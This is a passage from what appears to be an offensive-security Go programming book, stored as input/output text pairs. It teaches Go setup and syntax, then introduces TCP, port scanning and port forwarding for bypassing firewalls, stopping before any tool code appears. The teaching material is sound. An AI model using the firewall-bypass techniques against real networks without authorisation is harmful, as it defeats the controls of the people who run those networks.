directory, create the\nfollowing three subdirectories within: bin, pkg, and src (more\non these directories shortly). Then, set an environment\nvariable named GOPATH that points to your base workspace\ndirectory. For example, if you want to place your projects in a\ndirectory called gocode located within your home directory on\nLinux, you set GOPATH to the following:\nGOPATH=$HOME/gocode\nThe bin directory will contain your compiled and installed\nGo executable binaries. Binaries that are built and installed\nwill be automatically placed into this location. The pkg\ndirectory stores various package objects, including third-party\nGo dependencies that your code might rely on. For example,\nperhaps you want to use another developer’s code that more\nelegantly handles HTTP routing. The pkg directory will\ncontain the binary artifacts necessary to consume their\nimplementation in your code. Finally, the src directory will\ncontain all the evil source code you’ll write.\nThe location of your workspace is arbitrary, but the\ndirectories within must match this naming convention and\nstructure. The compilation, build, and package management\ncommands you’ll learn about later in this chapter all rely on\nthis common directory structure. Without this important setup,\nGo projects won’t compile or be able to locate any of their\nnecessary dependencies!\nAfter configuring the necessary GOROOT and GOPATH\nenvironment variables, confirm that they’re properly set. You\ncan do this on Linux and Windows via the set command. Also,\ncheck that your system can locate the binary and that you’ve\ninstalled the expected Go version with the go version command:\n$ go version\ngo version go1.11.5 linux/amd64\nThis command should return the version of the binary you\ninstalled.\nChoosing an Integrated Development Environment\nNext, you’ll probably want to select an integrated development\nenvironment (IDE) in which to write your code. Although an\nIDE isn’t required, many have features that help reduce errors\nin your code, add version-control shortcuts, aid in package\nmanagement, and more. As Go is still a fairly young language,\nthere may not be as many mature IDEs as for other languages.\nFortunately, advancements over the last few years leave\nyou with several, full-featured options. We’ll review some of\nthem in this chapter. For a more complete list of IDE or editor\noptions, check out the Go wiki page at\nhttps://github.com/golang/go/wiki/IDEsAndTextEditorPlugins/\n. This book is IDE/editor agnostic, meaning we won’t force\nyou into any one solution.\nVim Editor\nThe Vim text editor, available in many operating-system\ndistributions, provides a versatile, extensible, and completely\nopen source development environment. One appealing feature\nof Vim is that it lets users run everything from their terminal\nwithout fancy GUIs getting in the way.\nVim contains a vast ecosystem of plug-ins through which\nyou can customize themes, add version control, define\nsnippets, add layout and code-navigation features, include\nautocomplete, perform syntax highlighting and linting, and\nmuch, much more. Vim’s most common plug-in management\nsystems include Vundle and Pathogen.\nTo use Vim for Go, install the vim-go plug-in\n(https://github.com/fatih/vim-go/) shown in Figure 1-1.\nFigure 1-1: The vim-go plug-in\nOf course, to use Vim for Go development, you’ll have to\nbecome comfortable with Vim. Further, customizing your\ndevelopment environment with all the features you desire\nmight be a frustrating process. If you use Vim, which is free,\nyou’ll likely need to sacrifice some of the conveniences of\ncommercial IDEs.\nGitHub Atom\nGitHub’s IDE, called Atom (https://atom.io/), is a hackable\ntext editor with a large offering of community-driven\npackages. Unlike Vim, Atom provides a dedicated IDE\napplication rather than an in-terminal solution, as shown in\nFigure 1-2.\nFigure 1-2: Atom with Go support\nLike Vim, Atom is free. It provides tiling, package\nmanagement, version control, debugging, autocomplete, and a\nmyriad of additional features out of the box or through the use\nof the go-plus plug-in, which provides dedicated Go support\n(https://atom.io/packages/go-plus/).\nMicrosoft Visual Studio Code\nMicrosoft’s Visual Studio Code, or VS Code\n(https://code.visualstudio.com), is arguably one of the most\nfeature-rich and easiest IDE applications to configure. VS\nCode, shown in Figure 1-3, is completely open source and\ndistributed under an MIT license.\nFigure 1-3: The VS Code IDE with Go support\nVS Code supports a diverse set of extensions for themes,\nversioning, code completion, debugging, linting, and\nformatting. You can get Go integration with the vscode-go\nextension (https://github.com/Microsoft/vscode-go/).\nJetBrains GoLand\nThe JetBrains collection of development tools are efficient and\nfeature-rich, making both professional development and\nhobbyist projects easy to accomplish. Figure 1-4 shows what\nthe JetBrains GoLand IDE looks like.\nGoLand is the JetBrains commercial IDE dedicated to the\nGo language. Pricing for GoLand ranges from free for\nHivaNetwork.Com\nstudents, to $89 annually for individuals, to $199 annually for\norganizations. GoLand offers all the expected features of a\nrich IDE, including debugging, code completion, version\ncontrol, linting, formatting, and more. Although paying for a\nproduct may not sound appealing, commercial products such\nas GoLand typically have official support, documentation,\ntimely bug fixes, and some of the other assurances that come\nwith enterprise software.\nFigure 1-4: The GoLand commercial IDE\nUsing Common Go Tool Commands\nGo ships with several useful commands that simplify the\ndevelopment process. The commands themselves are\ncommonly included in IDEs, making the tooling consistent\nacross development environments. Let’s take a look at some of\nthese commands.\nThe go run Command\nOne of the more common commands you’ll execute during\ndevelopment, go run will compile and execute the main package\n—your program’s entry point.\nAs an example, save the following code under a project\ndirectory within $GOPATH/src (remember, you created this\nworkspace during installation) as main.go:\npackage main\nimport (\n\"fmt\"\n)\nfunc main() {\nfmt.Println(\"Hello, Black Hat Gophers!\")\n}\nFrom the command line, within the directory containing\nthis file, execute go run main.go. You should see Hello, Black Hat\nGophers! printed to your screen.\nThe go build Command\nNote that go run executed your file, but it didn’t produce a\nstandalone binary file. That’s where go build comes in. The go\nbuild command compiles your application, including any\npackages and their dependencies, without installing the results.\nIt creates a binary file on disk but doesn’t execute your\nprogram. The files it creates follow reasonable naming\nconventions, but it’s not uncommon to change the name of the\ncreated binary file by using the -o output command line option.\nRename main.go from the previous example to hello.go. In\na terminal window, execute go build hello.go. If everything goes\nas intended, this command should create an executable file\nwith the name hello. Now enter this command:\n$ ./hello\nHello, Black Hat Gophers!\nThis should run the standalone binary file.\nBy default, the produced binary file contains debugging\ninformation and the symbol table. This can bloat the size of\nthe file. To reduce the file size, you can include additional\nflags during the build process to strip this information from the\nbinary. For example, the following command will reduce the\nbinary size by approximately 30 percent:\n$ go build -ldflags \"-w -s\"\nHaving a smaller binary will make it more efficient to\ntransfer or embed while pursuing your nefarious endeavors.\nCross-Compiling\nUsing go build works great for running a binary on your current\nsystem or one of identical architecture, but what if you want to\ncreate a binary that can run on a different architecture? That’s\nwhere cross-compiling comes in. Cross-compiling is one of\nthe coolest aspects of Go, as no other language can do it as\neasily. The build command allows you to cross-compile your\nprogram for multiple operating systems and architectures.\nReference the official Go documentation at\nhttps://golang.org/doc/install/source#environment/ for further\ndetails regarding allowable combinations of compatible\noperating system and architecture compilation types.\nTo cross-compile, you need to set a constraint. This is just\na means to pass information to the build command about the\noperating system and architecture for which you’d like to\ncompile your code. These constraints include GOOS (for the\noperating system) and GOARCH (for the architecture).\nYou can introduce build constraints in three ways: via the\ncommand line, code comments, or a file suffix naming\nconvention. We’ll discuss the command line method here and\nleave the other two methods for you to research if you wish.\nLet’s suppose that you want to cross-compile your previous\nhello.go program residing on a macOS system so that it runs\non a Linux 64-bit architecture. You can accomplish this via the\ncommand line by setting the GOOS and GOARCH constraints\nwhen running the build command:\n$ GOOS=\"linux\" GOARCH=\"amd64\" go build hello.go\n$ ls\nhello hello.go\n$ file hello\nhello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not\nstripped\nThe output confirms that the resulting binary is a 64-bit\nELF (Linux) file.\nThe cross-compilation process is much simpler in Go than\nin just about any other modern programming language. The\nonly real “gotcha” happens when you try to cross-compile\napplications that use native C bindings. We’ll stay out of the\nweeds and let you dig into those challenges independently.\nDepending on the packages you import and the projects you\ndevelop, you may not have to worry about that very often.\nThe go doc Command\nThe go doc Command\nThe go doc command lets you interrogate documentation about\na package, function, method, or variable. This documentation\nis embedded as comments through your code. Let’s take a look\nat how to obtain details about the fmt.Println() function:\n$ go doc fmt.Println\nfunc Println(a ...interface{}) (n int, err error)\nPrintln formats using the default formats for its operands and writes to\nstandard output. Spaces are always added between operands and a newline\nis appended. It returns the number of bytes written and any write error\nencountered.\nThe output that go doc produces is taken directly out of the\nsource code comments. As long as you adequately comment\nyour packages, functions, methods, and variables, you’ll be\nable to automatically inspect the documentation via the go doc\ncommand.\nThe go get Command\nMany of the Go programs that you’ll develop in this book will\nrequire third-party packages. To obtain package source code,\nuse the go get command. For instance, let’s assume you’ve\nwritten the following code that imports the stacktitan/ldapauth\npackage:\npackage main\nimport (\n\"fmt\"\n\"net/http\"\n❶ \"github.com/stacktitan/ldapauth\"\n)\nEven though you’ve imported the stacktitan/ldapauth package\n❶, you can’t access the package quite yet. You first have to\nrun the go get command. Using go get github.com/stacktitan/ldapauth\ndownloads the actual package and places it within the\n$GOPATH/src directory.\nThe following directory tree illustrates the placement of the\nldapauth package within your GOPATH workspace:\n$ tree src/github.com/stacktitan/\n❶ src/github.com/stacktitan/\n└── ldapauth\n├── LICENSE\n├── README.md\n└── ldap_auth.go\nNotice that the path ❶ and the imported package name are\nconstructed in a way that avoids assigning the same name to\nmultiple packages. Using github.com/stacktitan as a preface to the\nactual package name ldapauth ensures that the package name\nremains unique.\nAlthough Go developers traditionally install dependencies\nwith go get, problems can arise if those dependent packages\nreceive updates that break backward compatibility. Go has\nintroduced two separate tools—dep and mod—to lock\ndependencies in order to prevent backward compatibility\nissues. However, this book almost exclusively uses go get to\npull down dependencies. This will help avoid inconsistencies\nwith ongoing dependency management tooling and hopefully\nmake it easier for you to get the examples up and running.\nThe go fmt Command\nThe go fmt command automatically formats your source code.\nFor example, running go fmt /path/to/your/package will style your\ncode by enforcing the use of proper line breaks, indentation,\nand brace alignment.\nAdhering to arbitrary styling preferences might seem\nstrange at first, particularly if they differ from your habits.\nHowever, you should find this consistency refreshing over\ntime, as your code will look similar to other third-party\npackages and feel more organized. Most IDEs contain hooks\nthat will automatically run go fmt when you save your file, so\nyou don’t need to explicitly run the command.\nThe golint and go vet Commands\nWhereas go fmt changes the syntactical styling of your code,\ngolint reports style mistakes such as missing comments,\nvariable naming that doesn’t follow conventions, useless type\nspecifications, and more. Notice that golint is a standalone tool,\nand not a subcommand of the main go binary. You’ll need to\ninstall it separately by using go get -u golang.org/x/lint/golint.\nSimilarly, go vet inspects your code and uses heuristics to\nidentify suspicious constructs, such as calling Printf() with the\nincorrect format string types. The go vet command attempts to\nidentify issues, some of which might be legitimate bugs, that a\ncompiler might miss.\nGo Playground\nThe Go Playground is an execution environment hosted at\nhttps://play.golang.org/ that provides a web-based frontend for\ndevelopers to quickly develop, test, execute, and share\nsnippets of Go code. The site makes it easy to try out various"
  },
  {
    "input": "Understanding Go Syntax",
    "output": "Go features without having to install or run Go on your local\nsystem. It’s a great way to test snippets of code before\nintegrating them within your projects.\nIt also allows you to simply play with various nuances of\nthe language in a preconfigured environment. It’s worth noting\nthat the Go Playground restricts you from calling certain\ndangerous functions to prevent you from, for example,\nexecuting operating-system commands or interacting with\nthird-party websites.\nOther Commands and Tools\nAlthough we won’t explicitly discuss other tools and\ncommands, we encourage you to do your own research. As\nyou create increasingly complex projects, you’re likely to run\ninto a desire to, for example, use the go test tool to run unit tests\nand benchmarks, cover to check for test coverage, imports to fix\nimport statements, and more.\nUNDERSTANDING GO SYNTAX\nAn exhaustive review of the entire Go language would take\nmultiple chapters, if not an entire book. This section gives a\nbrief overview of Go’s syntax, particularly relative to data\ntypes, control structures, and common patterns. This should\nact as a refresher for casual Go coders and an introduction for\nthose new to the language.\nFor an in-depth, progressive review of the language, we\nrecommend that you work through the excellent A Tour of Go\n(https://tour.golang.org/) tutorial. It’s a comprehensive, hands-\non discussion of the language broken into bite-sized lessons\nthat use an embedded playground to enable you to try out each\nof the concepts.\nThe language itself is a much cleaner version of C that\nremoves a lot of the lower-level nuances, resulting in better\nreadability and easier adoption.\nData Types\nLike most modern programming languages, Go provides a\nvariety of primitive and complex data types. Primitive types\nconsist of the basic building blocks (such as strings, numbers,\nand booleans) that you’re accustomed to in other languages.\nPrimitives make up the foundation of all information used\nwithin a program. Complex data types are user-defined\nstructures composed of a combination of one or more\nprimitive or other complex types.\nPrimitive Data Types\nThe primitive types include bool, string, int, int8, int16, int32, int64,\nuint, uint8, uint16, uint32, uint64, uintptr, byte, rune, float32, float64,\ncomplex64, and complex128.\nYou typically declare a variable’s type when you define it.\nIf you don’t, the system will automatically infer the variable’s\ndata type. Consider the following examples:\nvar x = \"Hello World\"\nz := int(42)\nIn the first example, you use the keyword var to define a\nvariable named x and assign to it the value \"Hello World\". Go\nimplicitly infers x to be a string, so you don’t have to declare\nthat type. In the second example, you use the := operator to\ndefine a new variable named z and assign to it an integer value\nof 42. There really is no difference between the two operators.\nWe’ll use both throughout this book, but some people feel that\nthe := operator is an ugly symbol that reduces readability.\nChoose whatever works best for you.\nIn the preceding example, you explicitly wrap the 42 value\nin an int call to force a type on it. You could omit the int call\nbut would have to accept whatever type the system\nautomatically uses for that value. In some cases, this won’t be\nthe type you intended to use. For instance, perhaps you want\n42 to be represented as an unsigned integer, rather than an int\ntype, in which case you’d have to explicitly wrap the value.\nSlices and Maps\nGo also has more-complex data types, such as slices and maps.\nSlices are like arrays that you can dynamically resize and pass\nto functions more efficiently. Maps are associative arrays,\nunordered lists of key/value pairs that allow you to efficiently\nand quickly look up values for a unique key.\nThere are all sorts of ways to define, initialize, and work\nwith slices and maps. The following example demonstrates a\ncommon way to define both a slice s and a map m and add\nelements to both:\nvar s = make([]string, 0)\nvar m = make(map[string]string)\ns = append(s, \"some string\")\nm[\"some key\"] = \"some value\"\nThis code uses the two built-in functions: make() to initialize\neach variable and append() to add a new item to a slice. The last\nHivaNetwork.Com\nline adds the key/value pair of some key and some value to the map\nm. We recommend that you read the official Go documentation\nto explore all the methods for defining and using these data\ntypes.\nPointers, Structs, and Interfaces\nA pointer points to a particular area in memory and allows you\nto retrieve the value stored there. As you do in C, you use the\n& operator to retrieve the address in memory of some variable,\nand the * operator to dereference the address. The following\nexample illustrates this:\n❶ var count = int(42)\n❷ ptr := &count\n❸ fmt.Println(*ptr)\n❹ *ptr = 100\n❺ fmt.Println(count)\nThe code defines an integer, count ❶, and then creates a\npointer ❷ by using the & operator. This returns the address of\nthe count variable. You dereference the variable ❸ while\nmaking a call to fmt.Println() to log the value of count to stdout.\nYou then use the * operator ❹ to assign a new value to the\nmemory location pointed to by ptr. Because this is the address\nof the count variable, the assignment changes the value of that\nvariable, which you confirm by printing it to the screen ❺.\nYou use the struct type to define new data types by\nspecifying the type’s associated fields and methods. For\nexample, the following code defines a Person type:\n❶ type Person struct {\n❷ Name string\n❸ Age int\n}\n❹ func (p *Person) SayHello() {\nfmt.Println(\"Hello,\", p.Name❺)\n}\nfunc main() {\nvar guy = new❻(Person)\n❼ guy.Name = \"Dave\"\n❽ guy.SayHello()\n}\nThe code uses the type keyword ❶ to define a new struct\ncontaining two fields: a string named Name ❷ and an int named\nAge\n❸.\nYou define a method, SayHello(), on the Person type assigned\nto variable p ❹. The method prints a greeting message to\nstdout by looking at the struct, p ❺, that received the call.\nThink of p as a reference to self or this in other languages. You\nalso define a function, main(), which acts as the program’s entry\npoint. This function uses the new keyword ❻ to initialize a new\nPerson. It assigns the name Dave to the person ❼ and then tells\nthe person to SayHello() ❽.\nStructs lack scoping modifiers—such as private, public, or\nprotected—that are commonly used in other languages to\ncontrol access to their members. Instead, Go uses\ncapitalization to determine scope: types and fields that begin\nwith a capital letter are exported and accessible outside the\npackage, whereas those starting with a lowercase letter are\nprivate, accessible only within the package.\nYou can think of Go’s interface type as a blueprint or a\ncontract. This blueprint defines an expected set of actions that\nany concrete implementation must fulfill in order to be\nconsidered a type of that interface. To define an interface, you\ndefine a set of methods; any data type that contains those\nmethods with the correct signatures fulfills the contract and is\nconsidered a type of that interface. Let’s take a look at an\nexample:\n❶ type Friend interface {\n❷ SayHello()\n}\nIn this sample, you’ve defined an interface called Friend ❶\nthat requires one method to be implemented: SayHello() ❷. That\nmeans that any type that implements the SayHello() method is a\nFriend. Notice that the Friend interface doesn’t actually\nimplement that function—it just says that if you’re a Friend, you\nneed to be able to SayHello().\nThe following function, Greet(), takes a Friend interface as\ninput and says hello in a Friend-specific way:\nfunc Greet❶ (f Friend❷) {\nf.SayHello()\n}\nYou can pass any Friend type to the function. Luckily, the\nPerson type used in the previous example can SayHello()—it’s a\nFriend. Therefore, if a function named Greet() ❶, as shown in the\npreceding code, expects a Friend as an input parameter ❷, you\ncan pass it a Person, like this:\nfunc main() {\nvar guy = new(Person)\nguy.Name = \"Dave\"\nGreet(guy)\n}\n}\nUsing interfaces and structs, you can define multiple types\nthat you can pass to the same Greet() function, so long as these\ntypes implement the Friend interface. Consider this modified\nexample:\n❶ type Dog struct {}\nfunc (d *Dog) SayHello()❷ {\nfmt.Println(\"Woof woof\")\n}\nfunc main() {\nvar guy = new(Person)\nguy.Name = \"Dave\"\n❸ Greet(guy)\nvar dog = new(Dog)\n❹ Greet(dog)\n}\nThe example shows a new type, Dog ❶, that is able to\nSayHello() ❷ and, therefore, is a Friend. You are able to Greet()\nboth a Person ❸ and a Dog ❹, since both are capable of\nSayHello().\nWe’ll cover interfaces multiple times throughout the book\nto help you better understand the concept.\nControl Structures\nGo contains slightly fewer control structures than other\nmodern languages. Despite that, you can still accomplish\ncomplex processing, including conditionals and loops, with\nGo.\nGo’s primary conditional is the if/else structure:\nif x == 1 {\nfmt.Println(\"X is equal to 1\")\n} else {\nfmt.Println(\"X is not equal to 1\")\n}\nGo’s syntax deviates slightly from the syntax of other\nlanguages. For instance, you don’t wrap the conditional check\n—in this case, x == 1—in parentheses. You must wrap all code\nblocks, even the preceding single-line blocks, in braces. Many\nother modern languages make the braces optional for single-\nline blocks, but they’re required in Go.\nFor conditionals involving more than two choices, Go\nprovides a switch statement. The following is an example:\nswitch x❶ {\ncase \"foo\"❷:\nfmt.Println(\"Found foo\")\ncase \"bar\"❸:\nfmt.Println(\"Found bar\")\ndefault❹:\nfmt.Println(\"Default case\")\n}\nIn this example, the switch statement compares the contents\nof a variable x ❶ against various values—foo ❷ and bar ❸—\nand logs a message to stdout if x matches one of the\nconditions. This example includes a default case ❹, which\nexecutes in the event that none of the other conditions match.\nNote that, unlike many other modern languages, your cases\ndon’t have to include break statements. In other languages,\nexecution often continues through each of the cases until the\ncode reaches a break statement or the end of the switch. Go will\nexecute no more than one matching or default case.\nGo also contains a special variation on the switch called a\ntype switch that performs type assertions by using a switch\nstatement. Type switches are useful for trying to understand\nthe underlying type of an interface. For example, you might\nuse a type switch to retrieve the underlying type of an interface\ncalled i:\nfunc foo(i❶ interface{}) {\nswitch v := i.(type)❷ {\ncase int:\nfmt.Println(\"I'm an integer!\")\ncase string:\nfmt.Println(\"I'm a string!\")\ndefault:\nfmt.Println(\"Unknown type!\")\n}\n}\nThis example uses special syntax, i.(type) ❷, to retrieve the\ntype of the i interface variable ❶. You use this value in a switch\nstatement in which each case matches against a specific type.\nIn this example, your cases check for int or string primitive\ntypes, but you could very well check for pointers or user-\ndefined struct types, for instance.\nGo’s last flow control structure is the for loop. The for loop\nis Go’s exclusive construct for performing iteration or\nrepeating sections of code. It might seem odd to not have\nconventions such as do or while loops at your disposal, but you\ncan re-create them by using variations of the for loop syntax.\nHere’s one variation of a for loop:\nfor i := 0; i < 10; i++ {\nfmt.Println(i)\n}\nThe code loops through numbers 0 to 9, printing each\nnumber to stdout. Notice the semicolons in the first line.\nUnlike many other languages, which use semicolons as line\ndelimiters, Go uses them for various control structures to\nperform multiple distinct, but related, subtasks in a single line\nof code. The first line uses the semicolons to separate the\ninitialization logic (i := 0), the conditional expression (i < 10),\nand the post statement (i++). This structure should be very,\nvery familiar to anyone who has coded in any modern\nlanguage, as it closely follows the conventions of those\nlanguages.\nThe following example shows a slight variation of the for\nloop that loops over a collection, such as a slice or a map:\n❶ nums := []int{2,4,6,8}\nfor idx❷, val❸ := range❹ nums {\nfmt.Println(idx, val)\n}\nIn this example, you initialize a slice of integers named\nnums ❶. You then use the keyword range ❹ within the for loop\nto iterate over the slice. The range keyword returns two values:\nthe current index ❷ and a copy of the current value ❸ at that\nindex. If you don’t intend to use the index, you could replace\nidx in the for loop with an underscore to tell Go you won’t need\nit.\nYou can use this exact same looping logic with maps as\nwell to return each key/value pair.\nConcurrency\nMuch like the control structures already reviewed, Go has a\nmuch simpler concurrency model than other languages. To\nexecute code concurrently, you can use goroutines, which are\nfunctions or methods that can run simultaneously. These are\noften described as lightweight threads because the cost of\ncreating them is minimal when compared to actual threads.\nTo create a goroutine, use the go keyword before the call to\na method or function you wish to run concurrently:\n❶ func f() {\nfmt.Println(\"f function\")\n}\nfunc main() {\n❷ go f()\ntime.Sleep(1 * time.Second)\nfmt.Println(\"main function\")\n}\nIn this example, you define a function, f() ❶, that you call\nin your main() function, the program’s entry point. You preface\nthe call with the keyword go ❷, meaning that the program will\nrun function f() concurrently; in other words, the execution of\nyour main() function will continue without waiting for f() to\ncomplete. You then use a time.Sleep(1 * time.Second) to force the\nmain() function to pause temporarily so that f() can complete. If\nyou didn’t pause the main() function, the program would likely\nexit prior to the completion of function f(), and you would\nnever see its results displayed to stdout. Done correctly, you’ll\nsee messages printed to stdout indicating that you’ve finished\nexecuting both the f() and main() functions.\nGo contains a data type called channels that provide a\nmechanism through which goroutines can synchronize their\nexecution and communicate with one another. Let’s look at an\nexample that uses channels to display the length of different\nstrings and their sum simultaneously:\n❶ func strlen(s string, c chan int) {\n❷ c <- len(s)\n}\nfunc main() {\n❸ c := make(chan int)\n❹ go strlen(\"Salutations\", c)\ngo strlen(\"World\", c)\n❺ x, y := <-c, <-c\nfmt.Println(x, y, x+y)\n}\nFirst, you define and use a variable c of type chan int. You\ncan define channels of various types, depending on the type of\ndata you intend to pass via the channel. In this case, you’ll be\npassing the lengths of various strings as integer values\nbetween goroutines, so you should use an int channel.\nNotice a new operator: <-. This operator indicates whether\nthe data is flowing to or from a channel. You can think of this\nas the equivalent of placing items into a bucket or removing\nitems from a bucket.\nThe function you define, strlen() ❶, accepts a word as a\nstring, as well as a channel that you’ll use for synchronizing\ndata. The function contains a single statement, c <- len(s) ❷,\nwhich uses the built-in len() function to determine the length of\nthe string, and then puts the result into the c channel by using\nthe <- operator.\nThe main() function pieces everything together. First, you\nissue a call to make(chan int) ❸ to create the integer channel. You\nthen issue multiple concurrent calls to the strlen() function by\nusing the go keyword ❹, which spins up multiple goroutines.\nYou pass to the strlen() function two string values, as well as the\nchannel into which you want the results placed. Lastly, you\nread data from the channel by using the <- operator ❺, this\ntime with data flowing from the channel. This means you’re\ntaking items out of your bucket, so to speak, and assigning\nthose values to the variables x and y. Note that execution\nblocks at this line until adequate data can be read from the\nchannel.\nWhen the line completes, you display the length of each\nstring as well as their sum to stdout. In this example, it\nproduces the following output:\n5 11 16\nThis may seem overwhelming, but it’s key to highlight\nbasic concurrency patterns, as Go shines in this area. Because\nconcurrency and parallelism in Go can become rather\ncomplicated, feel free to explore on your own. Throughout this\nbook, we’ll talk about more realistic and complicated\nimplementations of concurrency as we introduce buffered\nchannels, wait groups, mutexes, and more.\nError Handling\nUnlike most other modern programming languages, Go does\nnot include syntax for try/catch/finally error handling. Instead,\nit adopts a minimalistic approach that encourages you to check\nfor errors where they occur rather than allowing them to\n“bubble up” to other functions in the call chain.\nHivaNetwork.Com\nGo defines a built-in error type with the following interface\ndeclaration:\ntype error interface {\nError() string\n}\nThis means you can use any data type that implements a\nmethod named Error(), which returns a string value, as an error.\nFor example, here’s a custom error you could define and use\nthroughout your code:\n❶ type MyError string\nfunc (e MyError) Error() string❷ {\nreturn string(e)\n}\nYou create a user-defined string type named MyError ❶ and\nimplement an Error() string method ❷ for the type.\nWhen it comes to error handling, you’ll quickly get\naccustomed to the following pattern:\nfunc foo() error {\nreturn errors.New(\"Some Error Occurred\")\n}\nfunc main() {\nif err := foo()❶;err != nil❷ {\n// Handle the error\n}\n}\nYou’ll find that it’s fairly common for functions and\nmethods to return at least one value. One of these values is\nalmost always an error. In Go, the error returned may be a value\nof nil, indicating that the function generated no error and\neverything seemingly ran as expected. A non-nil value means\nsomething broke in the function.\nThus, you can check for errors by using an if statement, as\nshown in the main() function. You’ll typically see multiple\nstatements, separated by a semicolon. The first statement calls\nthe function and assigns the resulting error to a variable ❶.\nThe second statement then checks whether that error is nil ❷.\nYou use the body of the if statement to handle the error.\nYou’ll find that philosophies differ on the best way to\nhandle and log errors in Go. One of the challenges is that,\nunlike other languages, Go’s built-in error type doesn’t\nimplicitly include a stack trace to help you pinpoint the error’s\ncontext or location. Although you can certainly generate one\nand assign it to a custom type in your application, its\nimplementation is left up to the developers. This can be a little\nannoying at first, but you can manage it through proper\napplication design.\nHandling Structured Data\nSecurity practitioners will often write code that handles\nstructured data, or data with common encoding, such as JSON\nor XML. Go contains standard packages for data encoding.\nThe most common packages you’re likely to use include\nencoding/json and encoding/xml.\nBoth packages can marshal and unmarshal arbitrary data\nstructures, which means they can turn strings to structures, and\nstructures to strings. Let’s look at the following sample, which\nserializes a structure to a byte slice and then subsequently\ndeserializes the byte slice back to a structure:\n❶ type Foo struct {\nBar string\nBaz string\n}\nfunc main() {\n❷ f := Foo{\"Joe Junior\", \"Hello Shabado\"}\nb, _❸ := json.Marshal❹(f❺)\n❻ fmt.Println(string(b))\njson.Unmarshal(b❼, &f❽)\n}\nThis code (which deviates from best practices and ignores\npossible errors) defines a struct type named Foo ❶. You\ninitialize it in your main() function ❷ and then make a call to\njson.Marshal() ❹, passing it the Foo instance ❺. This Marshal()\nmethod encodes the struct to JSON, returning a byte slice ❸ that\nyou subsequently print to stdout ❻. The output, shown here, is\na JSON-encoded string representation of our Foo struct:\n{\"Bar\":\"Joe Junior\",\"Baz\":\"Hello Shabado\"}\nLastly, you take that same byte slice ❼ and decode it via a\ncall to json.Unmarshal(b, &f). This produces a Foo struct instance\n❽. Dealing with XML is nearly identical to this process.\nWhen working with JSON and XML, you’ll commonly use\nfield tags, which are metadata elements that you assign to your\nstruct fields to define how the marshaling and unmarshaling\nlogic can find and treat the affiliated elements. Numerous\nvariations of these field tags exist, but here is a short example\nthat demonstrates their usage for handling XML:\ntype Foo struct {\nBar string `xml:\"id,attr\"`\nBaz string `xml:\"parent>child\"`"
  },
  {
    "input": "Summary",
    "output": "Baz string `xml:\"parent>child\"`\n}\nThe string values, wrapped in backticks and following the\nstruct fields, are field tags. Field tags always begin with the\ntag name (xml in this case), followed by a colon and the\ndirective enclosed in double quotes. The directive defines how\nthe fields should be handled. In this case, you are supplying\ndirectives that declare that Bar should be treated as an attribute\nnamed id, not an element, and that Baz should be found in a\nsubelement of parent, named child. If you modify the previous\nJSON example to now encode the structure as XML, you\nwould see the following result:\n<Foo id=\"Joe Junior\"><parent><child>Hello Shabado</child></parent></Foo>\nThe XML encoder reflectively determines the names of\nelements, using the tag directives, so each field is handled\naccording to your needs.\nThroughout this book, you’ll see these field tags used for\ndealing with other data serialization formats, including ASN.1\nand MessagePack. We’ll also discuss some relevant examples\nof defining your own custom tags, specifically when you learn\nhow to handle the Server Message Block (SMB) Protocol.\nSUMMARY\nIn this chapter, you set up your Go environment and learned\nabout the fundamental aspects of the Go language. This is not\nan exhaustive list of all Go’s characteristics; the language is\nfar too nuanced and large for us to cram it all into a single\nchapter. Instead, we included the aspects that will be most\nuseful in the chapters that follow. We’ll now turn our attention\nto practical applications of the language for security\npractitioners and hackers. Here we Go!"
  },
  {
    "input": "2 TCP, SCANNERS, AND PROXIES",
    "output": "2\nTCP, SCANNERS, AND PROXIES\nLet’s begin our practical application of Go with the\nTransmission Control Protocol (TCP), the predominant\nstandard for connection-oriented, reliable communications and\nthe foundation of modern networking. TCP is everywhere, and\nit has well-documented libraries, code samples, and generally\neasy-to-understand packet flows. You must understand TCP to\nfully evaluate, analyze, query, and manipulate network traffic.\nAs an attacker, you should understand how TCP works and\nbe able to develop usable TCP constructs so that you can\nidentify open/closed ports, recognize potentially errant results\nsuch as false-positives—for example, syn-flood protections—\nand bypass egress restrictions through port forwarding. In this\nchapter, you’ll learn basic TCP communications in Go; build a\nconcurrent, properly throttled port scanner; create a TCP proxy\nthat can be used for port forwarding; and re-create Netcat’s\n“gaping security hole” feature.\nEntire textbooks have been written to discuss every nuance\nof TCP, including packet structure and flow, reliability,"
  },
  {
    "input": "Understanding the TCP Handshake",
    "output": "communication reassembly, and more. This level of detail is\nbeyond the scope of this book. For more details, you should\nread The TCP/IP Guide by Charles M. Kozierok (No Starch\nPress, 2005).\nUNDERSTANDING THE TCP\nHANDSHAKE\nFor those who need a refresher, let’s review the basics. Figure\n2-1 shows how TCP uses a handshake process when querying\na port to determine whether the port is open, closed, or\nfiltered.\nFigure 2-1: TCP handshake fundamentals\nIf the port is open, a three-way handshake takes place.\nFirst, the client sends a syn packet, which signals the"
  },
  {
    "input": "Bypassing Firewalls with Port Forwarding",
    "output": "beginning of a communication. The server then responds with\na syn-ack, or acknowledgment of the syn packet it received,\nprompting the client to finish with an ack, or acknowledgment\nof the server’s response. The transfer of data can then occur. If\nthe port is closed, the server responds with a rst packet instead\nof a syn-ack. If the traffic is being filtered by a firewall, the\nclient will typically receive no response from the server.\nThese responses are important to understand when writing\nnetwork-based tools. Correlating the output of your tools to\nthese low-level packet flows will help you validate that you’ve\nproperly established a network connection and troubleshoot\npotential problems. As you’ll see later in this chapter, you can\neasily introduce bugs into your code if you fail to allow full\nclient-server TCP connection handshakes to complete,\nresulting in inaccurate or misleading results.\nBYPASSING FIREWALLS WITH\nPORT FORWARDING\nPeople can configure firewalls to prevent a client from\nconnecting to certain servers and ports, while allowing access\nto others. In some cases, you can circumvent these restrictions\nby using an intermediary system to proxy the connection\naround or through a firewall, a technique known as port\nforwarding.\nMany enterprise networks restrict internal assets from\nestablishing HTTP connections to malicious sites. For this\nexample, imagine a nefarious site called evil.com. If an\nemployee attempts to browse evil.com directly, a firewall\nblocks the request. However, should an employee own an"
  },
  {
    "input": "Writing a TCP Scanner",
